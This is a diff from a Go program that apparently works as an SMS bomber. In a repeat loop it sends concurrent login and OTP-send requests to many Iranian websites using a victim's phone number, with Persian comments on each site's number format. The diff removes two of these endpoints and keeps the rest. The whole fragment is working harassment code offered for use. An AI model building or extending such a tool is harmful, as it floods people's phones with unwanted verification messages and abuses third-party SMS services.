@@ -328,14 +328,6 @@ func main() {
 	for i := 0; i < repeatCount; i++ {
         
 
-		// https://admin.zoodex.ir/api/v2/login/check?need_sms=1 (JSON)
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://admin.zoodex.ir/api/v2/login/check?need_sms=1", map[string]interface{}{
-				"mobile": phone, // نیاز به 0 اول دارد
-			}, &wg, ch)
-		}
-
 		// https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/getLoginMethod (JSON) - ghabzino part 1
 		wg.Add(1)
 		tasks <- func() {
@@ -477,16 +469,6 @@ func main() {
 
 
 			sendFormRequest(ctx, "https://www.chaymarket.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}
-
-
-		// https://api6.arshiyaniha.com/api/v2/client/otp/send (JSON) - فرمت عجیب شماره تلفن
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://api6.arshiyaniha.com/api/v2/client/otp/send", map[string]interface{}{
-				"cellphone": "0" + getPhoneNumber98NoZero(phone), // نیاز به 0098... دارد
-				"country_code": "98", // کد کشور ثابت
-			}, &wg, ch)
 		}
 
 		// https://steelalborz.com/wp-admin/admin-ajax.php (Form Data) - پیچیده، پارامترهای ثابت زیاد
